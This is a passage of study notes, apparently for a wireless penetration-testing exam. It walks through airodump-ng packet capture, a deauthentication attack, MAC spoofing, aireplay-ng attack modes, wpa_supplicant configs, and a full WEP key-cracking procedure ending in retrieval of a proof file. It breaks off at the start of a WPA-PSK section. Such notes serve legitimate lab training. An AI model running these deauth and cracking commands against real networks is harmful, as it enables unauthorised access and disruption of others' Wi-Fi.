id="175e0b5d-831e-8117-8782-c9d411db10d8" class="bulleted-list"><li style="list-style-type:circle"><mark class="highlight-yellow"><strong>Encryption</strong></mark>: Type of encryption (e.g., WPA, WEP, Open).</li></ul></li></ul></li></ol><ol type="1" id="175e0b5d-831e-8158-9b38-e6e1061b5c9d" class="numbered-list" start="2"><li><strong>Capture Packets:</strong><ul id="175e0b5d-831e-8142-88fc-e1e70cb92dcf" class="bulleted-list"><li style="list-style-type:disc">Command: <code>airodump-ng -w capture --output-format pcap wlan0mon</code></li></ul><ul id="175e0b5d-831e-8143-b52c-e512a986b4bd" class="bulleted-list"><li style="list-style-type:disc">Saves packets to a file for later analysis.</li></ul></li></ol><h2 id="175e0b5d-831e-8164-a92e-c1ed0ce7303a" class=""><mark class="highlight-blue"><strong>3. Discover Hidden Networks</strong></mark></h2><p id="175e0b5d-831e-8107-9a09-ecb8343bab10" class="">Hidden networks don’t broadcast their SSID, but they can still be detected by observing beacon frames or client connections.</p><h3 id="175e0b5d-831e-8102-aa9c-d9ba34fc83d7" class="">Steps:</h3><ol type="1" id="175e0b5d-831e-81b1-94da-d39c21a86766" class="numbered-list" start="1"><li><strong>Run Airodump-ng:</strong><ul id="175e0b5d-831e-814e-8d9b-ef5075b91b3d" class="bulleted-list"><li style="list-style-type:disc">Command: <code>airodump-ng wlan0mon</code></li></ul><ul id="175e0b5d-831e-810d-93c8-ddae21bc2fca" class="bulleted-list"><li style="list-style-type:disc">Hidden networks will appear with SSID as <code>&lt;length: 0&gt;</code> or blank.</li></ul></li></ol><ol type="1" id="175e0b5d-831e-815d-9c1d-d4cebfe6afa6" class="numbered-list" start="2"><li><strong>Deauthentication Attack:</strong><ul id="175e0b5d-831e-810d-aadc-f6eadf807738" class="bulleted-list"><li style="list-style-type:disc">Force clients to reconnect to reveal the SSID.</li></ul><ul id="175e0b5d-831e-81bf-8d3a-cce981c2ee4d" class="bulleted-list"><li style="list-style-type:disc">Command</li></ul><p id="175e0b5d-831e-81be-b40f-f2953f1fbbf6" class=""><code>aireplay-ng -0 10 -a [</code><mark class="highlight-yellow"><code>BSSID</code></mark><code>] wlan0mon</code> </p><ul id="175e0b5d-831e-8143-a4b6-cf3b22cfa44b" class="bulleted-list"><li style="list-style-type:disc">Watch <code>airodump-ng</code> to see the SSID appear.</li></ul></li></ol><h2 id="175e0b5d-831e-8113-b845-f9eda968a77b" class=""><mark class="highlight-blue"><strong>4. Change Channel</strong></mark></h2><p id="175e0b5d-831e-816b-8d33-c858c3f15d89" class="">Sometimes, you need to focus on a specific Wi-Fi channel to avoid missing packets.</p><h3 id="175e0b5d-831e-810a-9249-fad07634287d" class="">Steps:</h3><ol type="1" id="175e0b5d-831e-81dd-8dd4-e96f02d787db" class="numbered-list" start="1"><li><strong>Set Channel:</strong><ul id="175e0b5d-831e-813f-ac4c-f86f8a175756" class="bulleted-list"><li style="list-style-type:disc">Command: <code>iwconfig wlan0mon channel </code><mark class="highlight-yellow"><code>[number]</code></mark><ul id="175e0b5d-831e-81ab-974f-d99f91cee09d" class="bulleted-list"><li style="list-style-type:circle">Example: <code>iwconfig wlan0mon channel </code><mark class="highlight-yellow"><code>6</code></mark></li></ul></li></ul><ul id="175e0b5d-831e-8146-8131-d9c9b4c50f7e" class="bulleted-list"><li style="list-style-type:disc">Locks the interface to a specific channel.</li></ul></li></ol><ol type="1" id="175e0b5d-831e-81ba-aee7-ca2506919e17" class="numbered-list" start="2"><li><strong>Monitor Specific Channel:</strong><ul id="175e0b5d-831e-816e-b4c5-c11e1de14ca0" class="bulleted-list"><li style="list-style-type:disc">Command: <code>airodump-ng --channel </code><mark class="highlight-yellow"><code>[number]</code></mark><code> wlan0mon</code></li></ul></li></ol><h2 id="175e0b5d-831e-819b-8c69-d56f7f37a076" class=""><mark class="highlight-blue"><strong>5. Change MAC Address</strong></mark></h2><p id="175e0b5d-831e-81b7-9ae2-d81f604b5c02" class="">Changing your MAC address (spoofing) can anonymize your device or bypass MAC filtering.</p><h3 id="175e0b5d-831e-8185-aa5d-f5c4157266fb" class="">Steps:</h3><ol type="1" id="175e0b5d-831e-8195-bb12-e78b476059c2" class="numbered-list" start="1"><li><strong>Bring Down Interface:</strong><ul id="175e0b5d-831e-8166-ac69-f4831818027c" class="bulleted-list"><li style="list-style-type:disc">Command: <code>ifconfig wlan0mon down</code></li></ul></li></ol><ol type="1" id="175e0b5d-831e-8147-87cc-e84e7b55bec2" class="numbered-list" start="2"><li><strong>Change MAC Address:</strong><ul id="175e0b5d-831e-81f8-8fb4-d1886414ffe7" class="bulleted-list"><li style="list-style-type:disc">Command:</li></ul><p id="175e0b5d-831e-8174-af7a-e226ce9d86b3" class=""><mark class="highlight-yellow"><code>macchanger</code></mark><code> -r wlan0mon</code></p><ul id="175e0b5d-831e-819e-87e9-fabd85c41d89" class="bulleted-list"><li style="list-style-type:disc"><code>r</code>: Random MAC address.</li></ul><ul id="175e0b5d-831e-8103-978f-e8806124123f" class="bulleted-list"><li style="list-style-type:disc"><code>m [MAC]</code>: Set a specific MAC address.</li></ul><ol type="1" id="175e0b5d-831e-81e5-9090-c1040cd40137" class="numbered-list" start="1"><li><strong>Bring Up Interface:</strong><ul id="175e0b5d-831e-81af-a4cf-e63c7add35fb" class="bulleted-list"><li style="list-style-type:disc">Command: <code>ifconfig wlan0mon up</code></li></ul></li></ol><ol type="1" id="175e0b5d-831e-813b-abf2-d1c526a8ca20" class="numbered-list" start="2"><li><strong>Verify MAC Address:</strong><ul id="175e0b5d-831e-81ea-8cb1-e1422e0d85ef" class="bulleted-list"><li style="list-style-type:disc">Command: <mark class="highlight-yellow"><code>macchanger</code></mark><code> -s wlan0mon</code></li></ul></li></ol></li></ol><hr id="175e0b5d-831e-8051-8a50-f2ed28b0d792"/><h3 id="175e0b5d-831e-80f3-b705-da9cb5ed8a56" class=""><mark class="highlight-purple"><strong>Basic Usage </strong></mark><code><strong>airodump-ng</strong></code><strong> </strong></h3><ul id="175e0b5d-831e-8057-a7b6-e12adf49dc9c" class="bulleted-list"><li style="list-style-type:disc"><code>airodump-ng wlan0</code></li></ul><ul id="175e0b5d-831e-80e2-b8a0-ed404b971bd9" class="bulleted-list"><li style="list-style-type:disc">This command starts monitoring the <code>wlan0</code> interface for nearby wireless networks and displays information like SSID, BSSID, encryption type, channel, power level, etc.</li></ul><h3 id="175e0b5d-831e-8055-bf01-c54bd01bfbd3" class=""><strong>Key Features and Shortcuts:</strong></h3><ol type="1" id="175e0b5d-831e-80c3-bef9-ce5bd33386ee" class="numbered-list" start="1"><li><strong>Authentication Protocol (AUTH)</strong><ul id="175e0b5d-831e-800a-a03e-f0e454af375a" class="bulleted-list"><li style="list-style-type:disc">Displays the authentication method used by each network:<ul id="175e0b5d-831e-8010-8254-c63ac9560637" class="bulleted-list"><li style="list-style-type:circle"><mark class="highlight-yellow"><strong>MGT</strong></mark>: WPA/WPA2/WPA3 Enterprise.</li></ul><ul id="175e0b5d-831e-8062-a48e-ea9e64e727f0" class="bulleted-list"><li style="list-style-type:circle"><mark class="highlight-yellow"><strong>SKA</strong></mark>: WEP Shared Key.</li></ul><ul id="175e0b5d-831e-803e-b73d-f80f91f6e914" class="bulleted-list"><li style="list-style-type:circle"><mark class="highlight-yellow"><strong>PSK</strong></mark>: WPA/WPA2/WPA3 Pre-shared Key.</li></ul><ul id="175e0b5d-831e-8072-ab21-de616cb593e9" class="bulleted-list"><li style="list-style-type:circle"><mark class="highlight-yellow"><strong>OPN</strong></mark>: WEP Open Authentication.</li></ul></li></ul></li></ol><ol type="1" id="175e0b5d-831e-80ad-a37d-d9f6cee66ffb" class="numbered-list" start="2"><li><strong>Key Controls:</strong><ul id="175e0b5d-831e-80e3-bc6a-e4ba4c84e098" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow"><strong>A key</strong></mark>: Cycles through different display options (e.g., AP and stations, only APs, etc.).</li></ul><ul id="175e0b5d-831e-8017-9ea7-e0ea3711c0aa" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow"><strong>S key</strong></mark>: Cycles through different sorting options (e.g., by signal strength, BSSID, etc.).</li></ul><ul id="175e0b5d-831e-806c-8971-e0b9dfb94288" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow"><strong>I key</strong></mark>: Inverts the sorting order (e.g., from high to low signal strength).</li></ul><ul id="175e0b5d-831e-809f-863b-f4c410d55162" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow"><strong>D key</strong></mark>: Resets to the default sorting (by power level).</li></ul><ul id="175e0b5d-831e-8025-93a7-fb18387d9f0b" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow"><strong>Space Bar</strong></mark>: Freezes the display. The capture continues in the background, and the data can be analyzed at that point. Press <strong>space bar again</strong> to resume live updates.</li></ul><ul id="175e0b5d-831e-808b-873f-f6ae27177dad" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow"><strong>Tab key</strong></mark>: Enables or disables scrolling through the AP list. When scrolling is enabled:<ul id="175e0b5d-831e-80eb-98e6-fa3c60a1f35e" class="bulleted-list"><li style="list-style-type:circle"><mark class="highlight-yellow"><strong>Up and Down keys</strong></mark>: Navigate through the list of APs.</li></ul><ul id="175e0b5d-831e-80b9-ba34-f4eca2a539e7" class="bulleted-list"><li style="list-style-type:circle"><mark class="highlight-yellow"><strong>Selected APs</strong></mark><mark class="highlight-yellow"> </mark>will have their associated stations highlighted.</li></ul></li></ul><ul id="175e0b5d-831e-80a6-a912-f51c73eaffe9" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow"><strong>M key</strong></mark>: Cycles through color options for a selected AP to help with better visualization of data.</li></ul></li></ol><h3 id="175e0b5d-831e-801a-b18b-c3c135ebdf17" class=""><mark class="highlight-purple"><strong>Key Attack Options in</strong></mark><strong> </strong><code><strong>aireplay-ng</strong></code></h3><ul id="175e0b5d-831e-805f-a7fe-f220d6df6291" class="bulleted-list"><li style="list-style-type:disc"><code>aireplay-ng --deauth 0 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon</code></li></ul><p id="175e0b5d-831e-8070-95a3-ee03bc96b5f7" class=""><code><strong>aireplay-ng</strong></code> is used for <strong>packet injection</strong> and executing attacks on wireless networks. Here’s a summary:</p><ol type="1" id="175e0b5d-831e-80ac-8c20-d63988ea1f54" class="numbered-list" start="1"><li><mark class="highlight-yellow"><strong>Deauthentication </strong></mark><strong>(</strong><mark class="highlight-yellow"><strong>0</strong></mark><strong>)</strong>: Disconnects clients to capture WPA handshakes.</li></ol><ol type="1" id="175e0b5d-831e-807f-9bb0-f2eea45c7b50" class="numbered-list" start="2"><li><mark class="highlight-yellow"><strong>Fake Authentication </strong></mark><strong>(1)</strong>: Used in <strong>WEP</strong> networks to impersonate a client.</li></ol><ol type="1" id="175e0b5d-831e-80cc-a3e1-cee8aa30dcbb" class="numbered-list" start="3"><li><mark class="highlight-yellow"><strong>ARP Request Replay </strong></mark><strong>(3)</strong>: Replays ARP requests in <strong>WEP</strong> to generate traffic.</li></ol><ol type="1" id="175e0b5d-831e-80c5-ae7c-fb0cf0fc480b" class="numbered-list" start="4"><li><mark class="highlight-yellow"><strong>KoreK ChopChop </strong></mark><strong>(4)</strong>, <strong>Fragmentation (5)</strong>, <strong>Café-Latte (6)</strong>: <strong>WEP</strong>specific attacks for cracking encryption.</li></ol><ol type="1" id="175e0b5d-831e-8039-9500-dcc59c0e51f1" class="numbered-list" start="5"><li><mark class="highlight-yellow"><strong>Injection Test </strong></mark><strong>(9)</strong>: Checks if your wireless card supports packet injection for attacks.</li></ol><p id="175e0b5d-831e-801b-9370-ff454a83a7b7" class="">Focus on <strong>Deauthentication</strong> for WPA and <strong>Injection Test</strong> for verifying your card&#x27;s capabilities.</p><hr id="175e0b5d-831e-817f-a9b2-d0b3eeab182a"/><h2 id="175e0b5d-831e-813e-ba7d-f2dba44eedfb" class=""><mark class="highlight-purple"><strong>Connect to AP using CLI</strong></mark></h2><h3 id="175e0b5d-831e-81aa-befb-d18b4fb1ab12" class=""><mark class="highlight-blue"><strong>1. Connect to Open Network</strong></mark></h3><p id="175e0b5d-831e-8156-adb2-d03e6e1f7f9e" class=""><code><strong>open.conf</strong></code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="175e0b5d-831e-81c6-bf4d-d10ea11615e2" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">network={ssid=&quot;open-network&quot;
+	key_mgmt=NONE
+	scan_ssid=1
+}</code></pre><ul id="175e0b5d-831e-8102-85b9-e907d4082ee4" class="bulleted-list"><li style="list-style-type:disc"><strong>open Wi-Fi network</strong> (no password required)</li></ul><ul id="175e0b5d-831e-8197-b9f3-c3037243e31e" class="bulleted-list"><li style="list-style-type:disc"><code><strong>ssid=&quot;open-network&quot;</strong></code>: The name of the Wi-Fi network to connect to.</li></ul><ul id="175e0b5d-831e-813e-a66f-e22dad7265bb" class="bulleted-list"><li style="list-style-type:disc"><code><strong>key_mgmt=NONE</strong></code>: No encryption or authentication (open network).</li></ul><ul id="175e0b5d-831e-812d-bc66-c0efd3139d92" class="bulleted-list"><li style="list-style-type:disc"><code><strong>scan_ssid=1</strong></code>: Actively scans for the network, even if it&#x27;s hidden.</li></ul><h3 id="175e0b5d-831e-81ce-8477-f1854b4fdfe9" class=""><mark class="highlight-blue"><strong>2. Connect to PSK (WPA2) Networks</strong></mark></h3><p id="175e0b5d-831e-81dc-9562-f8df379f2338" class=""><code><strong>WPA2.conf</strong></code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="175e0b5d-831e-81da-97b3-f0e6f54a3cda" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">network={ssid=&quot;psk-network&quot;
+    psk=&quot;password&quot;
+    scan_ssid=1
+    key_mgmt=WPA-PSK
+    proto=WPA2
+}</code></pre><ul id="175e0b5d-831e-814f-924d-cbfe0798187e" class="bulleted-list"><li style="list-style-type:disc"><strong>WPA2-PSK</strong> network named <code>psk-network</code> using the password <code>password</code></li></ul><ul id="175e0b5d-831e-81c0-9bb7-f538f15ed5f8" class="bulleted-list"><li style="list-style-type:disc"><code><strong>key_mgmt=WPA-PSK</strong></code>: Uses WPA-PSK for security.</li></ul><ul id="175e0b5d-831e-8153-948a-ca0f1f79bf0e" class="bulleted-list"><li style="list-style-type:disc"><code><strong>proto=WPA2</strong></code>: Uses WPA2 encryption.</li></ul><h3 id="175e0b5d-831e-81f4-a5fb-d02ec58c1a77" class=""><mark class="highlight-blue"><strong>3. Connect to WPA (MGT) Enterprise</strong></mark></h3><p id="175e0b5d-831e-81d9-8a5e-d46259f438bd" class=""><code><strong>WPAMGT.conf</strong></code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="175e0b5d-831e-811e-9e82-e95911e831aa" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">network={ssid=&quot;mgt-mschap-network&quot;
+    scan_ssid=1
+    key_mgmt=WPA-EAP
+    eap=PEAP
+#anonymous_identity=&quot;DOMAIN\anonymous&quot;identity=&quot;DOMAIN\username&quot;
+    password=&quot;password&quot;
+    phase1=&quot;peapver=1&quot;
+#ca_cert=&quot;/root/certs/ca.crt&quot;#ieee80211w=0phase2=&quot;auth=MSCHAPV2&quot;
+}</code></pre><ul id="175e0b5d-831e-81ca-991d-cc092dcbfbb6" class="bulleted-list"><li style="list-style-type:disc"><code><strong>key_mgmt=WPA-EAP</strong></code>: Uses WPA-EAP for enterprise authentication.</li></ul><ul id="175e0b5d-831e-811c-883f-d29d50b15266" class="bulleted-list"><li style="list-style-type:disc"><code><strong>eap=PEAP</strong></code>: Specifies PEAP as the authentication method.</li></ul><ul id="175e0b5d-831e-816a-8146-f90b9beeb8ae" class="bulleted-list"><li style="list-style-type:disc"><code><strong>identity=&quot;DOMAIN\username&quot;</strong></code>: The username for authentication.</li></ul><ul id="175e0b5d-831e-81b9-ae0a-e1259f33cd5d" class="bulleted-list"><li style="list-style-type:disc"><code><strong>password=&quot;password&quot;</strong></code>: The password for the username.</li></ul><ul id="175e0b5d-831e-81aa-9d04-c78925c2b366" class="bulleted-list"><li style="list-style-type:disc"><code><strong>phase2=&quot;auth=MSCHAPV2&quot;</strong></code>: Uses <strong>MSCHAPv2</strong> for the second phase of authentication.</li></ul><h3 id="175e0b5d-831e-8162-9e45-c8dd59048c87" class=""><mark class="highlight-blue"><strong>4. Connect to WEP</strong></mark><mark class="highlight-blue"> Network</mark></h3><p id="175e0b5d-831e-812f-83c6-f181bed0b342" class=""><code>WEP.conf</code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="175e0b5d-831e-81b5-b90e-d5c5ffbf8459" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">wep-conf
+network={ssid=&quot;wep-network&quot;
+  key_mgmt=NONE
+  wep_key0=123456789a
+  wep_tx_keyidx=0
+}</code></pre><ul id="175e0b5d-831e-8114-91eb-c9d4cfc90dd7" class="bulleted-list"><li style="list-style-type:disc"><strong>WEP</strong> network (<code>wep-network</code>) using the key <code>123456789a</code> for encryption.</li></ul><ul id="175e0b5d-831e-819c-b5ba-c6749608da89" class="bulleted-list"><li style="list-style-type:disc"><code><strong>key_mgmt=NONE</strong></code>: No key management (WEP network).</li></ul><ul id="175e0b5d-831e-81fe-9068-dbc041df948c" class="bulleted-list"><li style="list-style-type:disc"><code><strong>wep_key0=123456789a</strong></code>: The WEP key used for encryption.</li></ul><ul id="175e0b5d-831e-81d1-92f1-d31ced6fd84f" class="bulleted-list"><li style="list-style-type:disc"><code><strong>wep_tx_keyidx=0</strong></code>: Specifies using <code>wep_key0</code> for transmission.</li></ul><hr id="175e0b5d-831e-817a-9053-f8309e80b15a"/><hr id="175e0b5d-831e-817a-93d8-c0deaaa37ab3"/><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><mark class="highlight-purple">WEP Attack(WEP WEP)</mark></summary><div class="indented"><ul id="175e0b5d-831e-8196-bef6-dfb57ecaf0d2" class="bulleted-list"><li style="list-style-type:disc"><code>airmon-ng start </code><mark class="highlight-yellow"><code><strong>wlan0</strong></code></mark></li></ul><ul id="175e0b5d-831e-817d-80de-c474b2aaf7f9" class="bulleted-list"><li style="list-style-type:disc"><code>iwconfig</code></li></ul><ul id="175e0b5d-831e-813e-b8e0-ea2088211e46" class="bulleted-list"><li style="list-style-type:disc"><code>airodump-ng </code><mark class="highlight-yellow"><code><strong>wlan0mon</strong></code></mark></li></ul><figure id="175e0b5d-831e-81b1-89cd-f2848d5708a1" class="image" style="text-align:left"><a href="image.png"><img style="width:768px" src="image.png"/></a></figure><ul id="175e0b5d-831e-80ee-8d1d-d412ce023324" class="bulleted-list"><li style="list-style-type:disc">Besside-ng can be used to <mark class="highlight-red">A</mark><mark class="highlight-red"><strong>utomatically </strong></mark>retrieve the password.</li></ul><ul id="175e0b5d-831e-81c0-9d6d-fa09b92ad79d" class="bulleted-list"><li style="list-style-type:disc"><code>besside-ng -c </code><mark class="highlight-yellow"><code><strong>3</strong></code></mark><code> -b </code><mark class="highlight-yellow"><code><strong>F0:9F:C2:71:22:11</strong></code></mark><code> </code><mark class="highlight-yellow"><code>wlan0mon</code></mark><code> -v</code> →  Avoid using besside-ng for automatic password cracking during the exam.</li></ul><p id="175e0b5d-831e-80ad-a810-c4933b29aedd" class="">
+</p><ul id="175e0b5d-831e-8050-af09-e5d87a88e3e3" class="bulleted-list"><li style="list-style-type:disc">Collect packets containing the WEP network details.</li></ul><ul id="175e0b5d-831e-8161-88ae-d5f3b8aaf1b9" class="bulleted-list"><li style="list-style-type:disc"><code>airodump-ng </code><mark class="highlight-yellow"><code><strong>wlan0mon </strong></code></mark><code>--bssid </code><mark class="highlight-yellow"><code><strong>F0:9F:C2:71:22:11</strong></code></mark><code> -c </code><mark class="highlight-yellow"><code><strong>3</strong></code></mark><code> -w </code><mark class="highlight-yellow"><code>wifi-old</code></mark></li></ul><figure id="175e0b5d-831e-8192-b958-d68fc3401668" class="image"><a href="image%201.png"><img style="width:672px" src="image%201.png"/></a></figure><ul id="175e0b5d-831e-80db-b3e5-d90f3c32b33d" class="bulleted-list"><li style="list-style-type:disc">Send a forged authentication request.</li></ul><ul id="175e0b5d-831e-81fe-af3e-fd0723d511ca" class="bulleted-list"><li style="list-style-type:disc"><code>sudo aireplay-ng -</code><mark class="highlight-yellow"><code><strong>1</strong></code></mark><code> 3600 -q  10 -a </code><mark class="highlight-yellow"><code><strong>F0:9F:C2:71:22:11</strong></code></mark><code> wlan0mon</code></li></ul><ul id="175e0b5d-831e-80bd-9f49-e503f98f1746" class="bulleted-list"><li style="list-style-type:disc">Note: The MAC address of the interface can be anything, or you can spoof it if desired.</li></ul><figure id="175e0b5d-831e-81bf-b883-dd39755001ce" class="image" style="text-align:left"><a href="image%202.png"><img style="width:672px" src="image%202.png"/></a></figure><ul id="175e0b5d-831e-80c9-9b05-c6c64aacf942" class="bulleted-list"><li style="list-style-type:disc">Retrieve the KEY.</li></ul><ul id="175e0b5d-831e-81e1-89ef-de84b6024eda" class="bulleted-list"><li style="list-style-type:disc"><code>aircrack-ng </code><mark class="highlight-yellow"><code><strong>wep.cap</strong></code></mark></li></ul><figure id="175e0b5d-831e-81f3-998c-e09d492df9ae" class="image" style="text-align:left"><a href="image%203.png"><img style="width:672px" src="image%203.png"/></a></figure><ul id="175e0b5d-831e-8188-a80a-c374d8714ad4" class="bulleted-list"><li style="list-style-type:disc"><a href="https://r4ulcl.com/posts/top-10-wi-fi-hacking-tips/#wep">https://r4ulcl.com/posts/top-10-wi-fi-hacking-tips/#wep</a></li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="175e0b5d-831e-815c-86da-f887a8c3015f" class="code"><code class="language-JavaScript">wep-conf
+network={
+  ssid=&quot;wep-network&quot;
+  key_mgmt=NONE
+  wep_key0=123456789a
+  wep_tx_keyidx=0
+}</code></pre><p id="175e0b5d-831e-81d4-a40a-ff309ea662c8" class="">                                                                                                                                                       <mark class="highlight-red"><strong>OR</strong></mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="175e0b5d-831e-81ee-bdf7-d9b2e6143247" class="code"><code class="language-JavaScript">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
+update_config=1
+network={
+    ssid=&quot;your_network_ssid&quot;
+    key_mgmt=NONE
+    wep_key0=your_wep_key
+    wep_tx_keyidx=0
+}</code></pre><p id="175e0b5d-831e-8175-95b0-e849ba19bcdc" class="">
+</p><ul id="175e0b5d-831e-81a5-bf78-c54b7c5c1704" class="bulleted-list"><li style="list-style-type:disc"><code>mousepad </code><mark class="highlight-yellow"><code><strong>wep.conf</strong></code></mark></li></ul><figure id="175e0b5d-831e-81e2-865f-df0fe35e6a01" class="image" style="text-align:left"><a href="image%204.png"><img style="width:288px" src="image%204.png"/></a></figure><ul id="175e0b5d-831e-8089-8cc4-e0fa2e7ba9ac" class="bulleted-list"><li style="list-style-type:disc">Now, send the file to the user&#x27;s machine.</li></ul><figure id="175e0b5d-831e-8126-8440-c2c5dcfa757e" class="image" style="text-align:left"><a href="image%205.png"><img style="width:672px" src="image%205.png"/></a></figure><figure id="175e0b5d-831e-81ee-b4ad-fd6030e83a6c" class="image" style="text-align:left"><a href="image%206.png"><img style="width:816px" src="image%206.png"/></a></figure><ul id="175e0b5d-831e-80b0-9273-c2b9feb7d520" class="bulleted-list"><li style="list-style-type:disc">Switch the interface back to managed mode.</li></ul><ul id="175e0b5d-831e-81f6-bb06-c2dd4af686a0" class="bulleted-list"><li style="list-style-type:disc"><code>airmon-ng stop </code><mark class="highlight-yellow"><code><strong>wlan0mon</strong></code></mark></li></ul><figure id="175e0b5d-831e-815c-98fd-dad6dc23645f" class="image" style="text-align:left"><a href="image%207.png"><img style="width:672px" src="image%207.png"/></a></figure><ul id="175e0b5d-831e-8167-80da-f5b6e1b4197f" class="bulleted-list"><li style="list-style-type:disc"><code>wpa_supplicant -i </code><mark class="highlight-yellow"><code><strong>wlan0</strong></code></mark><code> -c </code><mark class="highlight-yellow"><code><strong>wep.conf</strong></code></mark></li></ul><figure id="175e0b5d-831e-818b-a424-fd354d3d3f76" class="image" style="text-align:left"><a href="image%208.png"><img style="width:672px" src="image%208.png"/></a></figure><ul id="175e0b5d-831e-81ff-bc7a-ecc703f20a9e" class="bulleted-list"><li style="list-style-type:disc"><code>dhclient </code><mark class="highlight-yellow"><code>wlan0 </code></mark><code>-v</code></li></ul><figure id="175e0b5d-831e-8114-b47b-f23360030cb2" class="image" style="text-align:left"><a href="image%209.png"><img style="width:768px" src="image%209.png"/></a></figure><ul id="175e0b5d-831e-8098-9f48-fae2ead6382d" class="bulleted-list"><li style="list-style-type:disc">If proof.txt exists, we can access it.</li></ul><ul id="175e0b5d-831e-80fe-a104-ee9d07a23d5b" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-red"><strong>Note</strong></mark>: You will have access to proof.txt in the exam.</li></ul><ul id="175e0b5d-831e-81d5-9812-d5baaae359ec" class="bulleted-list"><li style="list-style-type:disc"><code>curl http://</code><mark class="highlight-yellow"><code>192.168.1.1</code></mark><code>/</code><mark class="highlight-yellow"><code>proof.txt</code></mark></li></ul><figure id="175e0b5d-831e-8194-9456-c8f914caca15" class="image" style="text-align:left"><a href="image%2010.png"><img style="width:720px" src="image%2010.png"/></a></figure></div></details><hr id="175e0b5d-831e-8002-970d-d7cc97e376ce"/><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><mark class="highlight-purple">WPA-PSK</mark></summary><div class="indented"><ul id="175e0b5d-831e-8131-a689-fab2bb0a9806" class="bulleted-list"><li style="list-style-type:disc"><code>airmon-ng start </code><mark class="highlight-yellow"><code><strong>wlan0</strong></code></mark></li></ul><figure id="175e0b5d-831e-816b-a7a4-ee795d87d368" class="image" style="text-align:left"><a href="image%2011.png"><img style="width:768px" 